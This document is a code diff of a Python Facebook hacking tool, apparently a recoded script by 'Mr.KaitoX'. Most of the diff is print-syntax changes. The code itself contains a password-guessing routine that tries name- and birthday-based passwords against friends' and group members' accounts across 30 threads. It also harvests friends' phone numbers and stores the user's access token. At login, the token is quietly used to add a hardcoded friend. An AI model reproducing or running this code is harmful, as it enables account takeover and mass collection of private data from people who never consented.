@@ -4,14 +4,14 @@ from multiprocessing.pool import ThreadPool
 try:
     import requests
 except ImportError:
-    os.system("pip2 install requests")
+    os.system("pkg install requests")
 from requests.exceptions import ConnectionError
 from mechanize import Browser
 
 try:
     import mechanize
 except ImportError:
-    os.system("pip2 install mechanize")
+    os.system("pkg install mechanize")
 
 reload(sys)
 sys.setdefaultencoding('utf8')
@@ -100,8 +100,8 @@ def login():
         menu()
     except (KeyError, IOError):
         os.system('clear')
-        print banner2
-        print G+'    Login Your Facebook Account'+N
+        print(banner2)
+        print(G+'    Login Your Facebook Account'+N)
         id = raw_input( V + '    Email ' + R + ' > ' + W)
         pwd = getpass.getpass( V + '    Paswd ' + R + ' > ' + W)
         os.system('clear')
@@ -109,7 +109,7 @@ def login():
         try:
             br.open('https://m.facebook.com')
         except mechanize.URLError:
-            print '\n\x1b[1;91m[!] Please Check your Connection!\n\n'+N
+            print('\n\x1b[1;91m[!] Please Check your Connection!\n\n'+N)
             exit()
 
         br._factory.is_html = True
@@ -132,13 +132,13 @@ def login():
                 zedd = open('login.txt', 'w')
                 zedd.write(z['access_token'])
                 zedd.close()
-                print '\n[#] Login Successfully!!'
+                print('\n[#] Login Successfully!!')
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                 os.system('xdg-open https://www.youtube.com/kaitolegion')
                 time.sleep(1)
                 menu()
             except requests.exceptions.ConnectionError:
-                print R + '\n[!] Please Check your Connection'
+                print(R + '\n[!] Please Check your Connection')
                 quit()
 
         if 'checkpoint' in url:
@@ -158,7 +158,7 @@ def menu():
         toket = open('login.txt', 'r').read()
     except IOError:
         os.system('clear')
-        print R + '[!] Token not found'
+        print(R + '[!] Token not found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -177,31 +177,31 @@ def menu():
             time.sleep(1)
             login()
         except requests.exceptions.ConnectionError:
-            print banner
-            print '\x1b[1;91m[!]Please Check your Connection!'
+            print(banner)
+            print('\x1b[1;91m[!]Please Check your Connection!')
             quit()
 
     os.system('clear')
-    print banner
-    print V+' Welcome'+N+' [ '+ G + nama + N+ ' ] '
-    print R+15 * '-'+G+'[ \033[1;97mMenu'+N+G+' ]'+R+ 15* '-'+N
-    print W + ' 1.' + G + ' Start Cracking'
-    print W + ' 2.' + G + ' Dump Group ID\'s'
-    print W + ' 3.' + G + ' Dump Phone Numbers'
-    print W + ' 4.' + G + ' Profile Guard'
-    print W + ' 5.' + G + ' Auto Reaction'
-    print W + ' 6.' + G + ' Auto Report'
-    print W + ' 7.' + G + ' Developer'
-    print W + ' 8.' + G + ' Logout'
-    print W + ' 0.' + R + ' Exit'
-    print ''
+    print(banner)
+    print(V+' Welcome'+N+' [ '+ G + nama + N+ ' ] ')
+    print(R+15 * '-'+G+'[ \033[1;97mMenu'+N+G+' ]'+R+ 15* '-'+N)
+    print(W + ' 1.' + G + ' Start Cracking')
+    print(W + ' 2.' + G + ' Dump Group ID\'s')
+    print(W + ' 3.' + G + ' Dump Phone Numbers')
+    print(W + ' 4.' + G + ' Profile Guard')
+    print(W + ' 5.' + G + ' Auto Reaction')
+    print(W + ' 6.' + G + ' Auto Report')
+    print(W + ' 7.' + G + ' Developer')
+    print(W + ' 8.' + G + ' Logout')
+    print(W + ' 0.' + R + ' Exit')
+    print('')
     pilih()
 
 
 def pilih():
     zedd = raw_input(G + '~@adapcsg ' + R + '\xe2\x96\xb6 ' + W)
     if zedd == '':
-        print '\x1b[1;91m [!] Empty command'
+        print('\x1b[1;91m [!] Empty command')
         pilih()
     elif zedd == '1':
         super()
@@ -215,13 +215,13 @@ def pilih():
         autoliker()
         time.sleep(5)
     elif zedd == '6':
-        print 'Not Available Now'
+        print('Not Available Now')
         menu()
     elif zedd == '7':
         os.system('clear')
-        print ' \033[1;93mRecoded : \033[1;92mMr.KaitoX\n \033[1;93mTeam : \033[1;92madapcsg  \n \033[1;93mFacebook : \033[1;92mhttps://facebook.com/kaitolegionofficial \n\033[1;93m Github : \033[1;92mhttps://www.github.com/mrkaitox \n\033[1;93m YouTube : \033[1;92mhttps://youtube.com/kaitolegion'
-        print '\n'
-        print G+' Special Greetz:'+V+' \n Infinite \n Ph.Osus \n Ph.Bloodz \n AnonPrixor \n P4r4site \n Aries \n Fox Blood \n Mr.M3ll0w \n s4yt4m5 \n XxJohnxX \n Scroider'
+        print(' \033[1;93mRecoded : \033[1;92mMr.KaitoX\n \033[1;93mTeam : \033[1;92madapcsg  \n \033[1;93mFacebook : \033[1;92mhttps://facebook.com/kaitolegionofficial \n\033[1;93m Github : \033[1;92mhttps://www.github.com/mrkaitox \n\033[1;93m YouTube : \033[1;92mhttps://youtube.com/kaitolegion')
+        print('\n')
+        print(G+' Special Greetz:'+V+' \n Infinite \n Ph.Osus \n Ph.Bloodz \n AnonPrixor \n P4r4site \n Aries \n Fox Blood \n Mr.M3ll0w \n s4yt4m5 \n XxJohnxX \n Scroider')
         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
         menu()
     elif zedd == '8':
@@ -229,11 +229,11 @@ def pilih():
         quit()
     elif zedd == '0':
         os.system('clear')
-        print G + 'Bye Bye Tool Love Kaito <3'+N
+        print(G + 'Bye Bye Tool Love Kaito <3'+N)
         raw_input(R + '[ ' + W + 'Quit' + R + ' ]' + N)
         quit()
     else:
-        print R + ' [+] Wrong Command!'
+        print(R + ' [+] Wrong Command!')
         pilih()
        
 ###########################################################################
@@ -243,7 +243,7 @@ def pilih():
 def report():
     try:
         os.system('clear')
-        print banner
+        print(banner)
         id = raw_input(R+'[+]'+G+' Enter Target Id: '+W)
         my = ("https://m.facebook.com/"+id)
         url = my
@@ -285,7 +285,7 @@ def test2():
         br.submit()
         return test3()
     except Exception as f:
-        print (' [+] Bad404')
+        print(' [+] Bad404')
                 
 def test3():     
     try:         
@@ -295,7 +295,7 @@ def test3():
         br.submit()
         return _test4()
     except Exception as f:         
-        print ('    Bad405')
+        print('    Bad405')
                  
 def test4():     
     try:         
@@ -307,11 +307,11 @@ def test4():
         jj.write(_id)
         print ''
         time.sleep(2)
-        print (G+'[-]Reported ')
+        print(G+'[-]Reported ')
         time.sleep(1)
         exit()
     except Exception as f:         
-        print ('    Bad406')
+        print('    Bad406')
         
 ###########################################################################
 #                           Auto Reaction                                 #
@@ -323,7 +323,7 @@ def autoliker():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token not found'
+        print('\x1b[1;91m[!] Token not found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
@@ -373,7 +373,7 @@ def react():
                                 if kai == '0':
                                     menu()
                                 else:
-                                    print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mTidak ada'
+                                    print('\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + aksi + ' \x1b[1;91mTidak ada')
                                     react()
 
 
@@ -382,33 +382,33 @@ def root():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\033[1;91m[!] Token not found'
+        print('\033[1;91m[!] Token not found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
     else:
         os.system('clear')
-        print banner
-        print 10 * ' '+G+'[ Auto React ]\n'+N
+        print(banner)
+        print(10 * ' '+G+'[ Auto React ]\n'+N)
         ide = raw_input('\x1b[1;91m[+] \x1b[1;92mID Target \x1b[1;91m:\x1b[1;97m ')
         limit = raw_input('\x1b[1;91m[!] \x1b[1;92mLimit \x1b[1;91m:\x1b[1;97m ')
         try:
             oh = requests.get('https://graph.facebook.com/' + ide + '?fields=feed.limit(' + limit + ')&access_token=' + toket)
             ah = json.loads(oh.text)
             loading('\x1b[1;91m[\xe2\x9c\xba] \x1b[1;92mPlease wait \x1b[1;97m...')
-            print ''
+            print('')
             for a in ah['feed']['data']:
                 y = a['id']
                 reaksi.append(y)
                 requests.post('https://graph.facebook.com/' + y + '/reactions?type=' + tipe + '&access_token=' + toket)
-                print '\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe
+                print('\x1b[1;92m[\x1b[1;97m' + y[:10].replace('\n', ' ') + '... \x1b[1;92m] \x1b[1;97m' + tipe)
 
-            print
-            print '\r\x1b[1;91m[+]\x1b[1;97m Result \x1b[1;96m' + str(len(reaksi))
+            print()
+            print('\r\x1b[1;91m[+]\x1b[1;97m Result \x1b[1;96m' + str(len(reaksi)))
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu()
         except KeyError:
-            print '\x1b[1;91m[!] Wrong ID'
+            print('\x1b[1;91m[!] Wrong ID')
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu()
         except KeyboardInterrupt:
@@ -425,18 +425,18 @@ def guard():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print R+'[!] Token not found'
+        print(R+'[!] Token not found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
 
     os.system('clear')
-    print banner
-    print 10 * ' '+G+'[ Profile Guard ]\n'+N
-    print G+'['+W+'01'+G+'] Enable'+N
-    print G+'['+W+'02'+G+'] Disable'+N
-    print R+'['+W+'00'+R+'] Back'+N
-    print ''
+    print(banner)
+    print(10 * ' '+G+'[ Profile Guard ]\n'+N)
+    print(G+'['+W+'01'+G+'] Enable'+N)
+    print(G+'['+W+'02'+G+'] Disable'+N)
+    print(R+'['+W+'00'+R+'] Back'+N)
+    print('')
     turn()
     
 def turn():
@@ -453,10 +453,10 @@ def turn():
                 menu()
             else:
                 if g == '':
-                    print R+'Can\'t be Empty'+N
+                    print(R+'Can\'t be Empty'+N)
                     turn()
                 else:
-                    print R+'Can\'t be Empty'+N
+                    print(R+'Can\'t be Empty'+N)
                     turn()
 
 def get_userid(toket):
@@ -472,24 +472,24 @@ def gaz(toket, enable=True):
     headers = {'Content-Type': 'application/x-www-form-urlencoded', 'Authorization': 'OAuth %s' % toket}
     url = 'https://graph.facebook.com/graphql'
     res = requests.post(url, data=data, headers=headers)
-    print res.text
+    print(res.text)
     if '"is_shielded":true' in res.text:
         os.system('clear')
-        print banner
-        print ''
-        print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mActivated'
+        print(banner)
+        print('')
+        print('\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mActivated')
         raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
         guard()
     else:
         if '"is_shielded":false' in res.text:
             os.system('clear')
-            print banner
-            print ''
-            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDeactivated'
+            print(banner)
+            print('')
+            print('\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;91mDeactivated')
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             guard()
         else:
-            print '\x1b[1;91m[!] Error'
+            print('\x1b[1;91m[!] Error')
             menu()
 
 ###########################################################################
@@ -500,15 +500,15 @@ def dumpg():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token not found'
+        print('\x1b[1;91m[!] Token not found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
     else:
         os.system('clear')
-        print banner
+        print(banner)
         loading(' Please wait ...')
-        print ''
+        print('')
         try:
             uh = requests.get('https://graph.facebook.com/me/groups?access_token=' + toket)
             group = json.loads(uh.text)
@@ -517,27 +517,27 @@ def dumpg():
                 id = p['id']
                 f = open('id.txt', 'w')
                 listgrup.append(id)
-                print G + '[+] Name ' + V + '-> ' + W + str(nama)
-                print G + '[-] ID   ' + V + '-> ' + W + str(id)
-                print ''
+                print(G + '[+] Name ' + V + '-> ' + W + str(nama))
+                print(G + '[-] ID   ' + V + '-> ' + W + str(id))
+                print('')
 
-            print '\n[+] Total Groups : %s' % len(listgrup)
+            print('\n[+] Total Groups : %s' % len(listgrup))
             f.close()
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu()
         except (KeyboardInterrupt, EOFError):
-            print '\x1b[1;91m[!] Stopped'
+            print('\x1b[1;91m[!] Stopped')
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu()
         except KeyError:
-            print '\x1b[1;91m[!] Group not found'
+            print('\x1b[1;91m[!] Group not found')
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu()
         except requests.exceptions.ConnectionError:
-            print '\x1b[1;91m[\xe2\x9c\x96] No connection'
+            print('\x1b[1;91m[\xe2\x9c\x96] No connection')
             quit()
         except IOError:
-            print '\x1b[1;91m[!] Error when creating file'
+            print('\x1b[1;91m[!] Error when creating file')
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             menu()
 
@@ -549,7 +549,7 @@ def phone():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"\033[1;91m[!] Token not found"
+		print("\033[1;91m[!] Token not found")
 		os.system('rm -rf login.txt')
 		time.sleep(1)
 		login()
@@ -559,7 +559,7 @@ def phone():
 		pass
 	try:
 		os.system('clear')
-		print banner2
+		print(banner2)
 		loading('\033[1;92m Getting friends mobile number ')
 		url= "https://graph.facebook.com/me/friends?access_token="+toket
 		r =requests.get(url)
@@ -571,20 +571,20 @@ def phone():
 			try:
 				hp.append(z['mobile_phone'])
 				bz.write(z['mobile_phone'] + '\n')
-				print ("\r\033[1;92m "+str(len(hp))+"\033[1;97m.\033[1;97m  \033[1;92m"+z['name']+" "+V+z['mobile_phone']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
+				print("\r\033[1;92m "+str(len(hp))+"\033[1;97m.\033[1;97m  \033[1;92m"+z['name']+" "+V+z['mobile_phone']+"\n"),;sys.stdout.flush();time.sleep(0.0001)
 			except KeyError:
 				pass
 		bz.close()
 		
-		print '\r\033[1;91m[\033[1;96m?\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....'
-		print"\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp))
+		print('\r\033[1;91m[\033[1;96m?\033[1;91m] \033[1;92mSuccessfully get number \033[1;97m....')
+		print("\r\033[1;91m[+] \033[1;92mTotal Number \033[1;91m: \033[1;97m%s"%(len(hp)))
 		done = raw_input("\r\033[1;91m[+] \033[1;92mSave file with name\033[1;91m :\033[1;97m ")
 		os.rename('result/phone_number.txt','result/'+done)
 		print("\r\033[1;91m[+] \033[1;92mFile saved \033[1;91m: \033[1;97mout/"+done)
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu()
 	except IOError:
-		print"\033[1;91m[!] Error creating file"
+		print("\033[1;91m[!] Error creating file")
 		raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 		menu()
 	except (KeyboardInterrupt,EOFError):
@@ -608,29 +608,29 @@ def super():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token not found'
+        print('\x1b[1;91m[!] Token not found')
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
 
     os.system('clear')
-    print banner
-    print W + ' 1.' + G + ' Cracked from friends Facebook'
-    print W + ' 2.' + G + ' Cracked from Group Facebook'
-    print W + ' 3.' + G + ' Cracked from File ID'
-    print W + ' 0.' + R + ' Exit'
-    print ''
+    print(banner)
+    print(W + ' 1.' + G + ' Cracked from friends Facebook')
+    print(W + ' 2.' + G + ' Cracked from Group Facebook')
+    print(W + ' 3.' + G + ' Cracked from File ID')
+    print(W + ' 0.' + R + ' Exit')
+    print('')
     pilih_super()
 
 
 def pilih_super():
     peak = raw_input(G + ' adapcsg\x1b[1;91m >\x1b[1;97m ')
     if peak == '':
-        print '\x1b[1;91m[!] Empty command'
+        print('\x1b[1;91m[!] Empty command')
         pilih_super()
     elif peak == '1':
         os.system('clear')
-        print banner
+        print(banner)
         loading(G + '[+] ' + V + 'Cracking Please Wait...')
         r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
         z = json.loads(r.text)
@@ -639,14 +639,14 @@ def pilih_super():
 
     elif peak == '2':
         os.system('clear')
-        print banner
+        print(banner)
         idg = raw_input('\x1b[1;91m[+] \x1b[1;92m Group ID  \x1b[1;91m:\x1b[1;97m ')
         try:
             r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
             asw = json.loads(r.text)
-            print '\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName Group \x1b[1;91m:\x1b[1;97m ' + asw['name']
+            print('\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mName Group \x1b[1;91m:\x1b[1;97m ' + asw['name'])
         except KeyError:
-            print '\x1b[1;91m[!] Group not found'
+            print('\x1b[1;91m[!] Group not found')
             raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
             super()
 
@@ -658,7 +658,7 @@ def pilih_super():
     elif peak == '3':
     	os.system('clear')
     	try:
-    		print banner
+    		print(banner)
     		idlist = raw_input('\x1b[1;91m[+] \x1b[1;92m File ID  \x1b[1;91m:\x1b[1;97m')
     		for line in open(idlist, 'r').readlines():
     			id.append(line.strip())
@@ -668,9 +668,9 @@ def pilih_super():
     elif peak == '0':
         menu()
     else:
-        print '\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mCan\'t be Empty'
+        print('\x1b[1;91m[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mCan\'t be Empty')
         pilih_super()
-    print G + '[+]' + V + ' Total ID \x1b[1;91m: \x1b[1;97m' + str(len(id))
+    print(G + '[+]' + V + ' Total ID \x1b[1;91m: \x1b[1;97m' + str(len(id)))
     loading(G + '[=] Please wait \x1b[1;97m...\n')
 
     def main(arg):
@@ -683,27 +683,27 @@ def pilih_super():
             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
             q = json.load(data)
             if 'access_token' in q:
-                print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1
+                print('\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass1)
             elif 'www.facebook.com' in q['error_msg']:
-                print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1
+                print('\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass1)
             else:
             	# Password Guess 2
                 pass2 = b['first_name'] + '12345'
                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                 q = json.load(data)
                 if 'access_token' in q:
-                    print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass2
+                    print('\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass2)
                 elif 'www.facebook.com' in q['error_msg']:
-                    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2
+                    print('\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass2)
                 else:
                 	# Password Guess 3
                     pass3 = b['last_name'] + '123'
                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                     q = json.load(data)
                     if 'access_token' in q:
-                        print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass3
+                        print('\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass3)
                     elif 'www.facebook.com' in q['error_msg']:
-                        print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3
+                        print('\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass3)
                     else:
                     	# Password Guess 4
                         birth = b['birthday']
@@ -711,27 +711,27 @@ def pilih_super():
                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                         q = json.load(data)
                         if 'access_token' in q:
-                            print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass4
+                            print('\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass4)
                         elif 'www.facebook.com' in q['error_msg']:
-                            print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4
+                            print('\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass4)
                         else:
                             # Password Guess 5
                             pass5 = b['last_name'] + '04'
                             data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                             q = json.load(data)
                             if 'access_token' in q:
-                            	print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass5
+                            	print('\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass5)
                             elif 'www.facebook.com' in q['error_msg']:
-                            	print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5
+                            	print('\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass5)
                             else:
                             	# Password Guess 6
                             	pass6 = b['first_name'] + '04'
                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                 q = json.load(data)
                                 if 'access_token' in q:
-                                	print '\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass6
+                                	print('\n\x1b[1;95m Email :\x1b[1;97m ' + user + ' \n\x1b[1;95m Password :\x1b[1;97m ' + pass6)
                                 elif 'www.facebook.com' in q['error_msg']:
-                            	    print '\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6
+                            	    print('\n\x1b[1;91m Email :\x1b[1;97m ' + user + ' \n\x1b[1;91m Password :\x1b[1;97m ' + pass6)
                                 else:
                                 	pass
                             		
@@ -740,7 +740,7 @@ def pilih_super():
 
     p = ThreadPool(30)
     p.map(main, id)
-    print '\n\x1b[1;91m[+] \x1b[1;97mFinish'
+    print('\n\x1b[1;91m[+] \x1b[1;97mFinish')
     raw_input('\n\x1b[1;91m[ \x1b[1;97mBack \x1b[1;91m]')
     super()
 
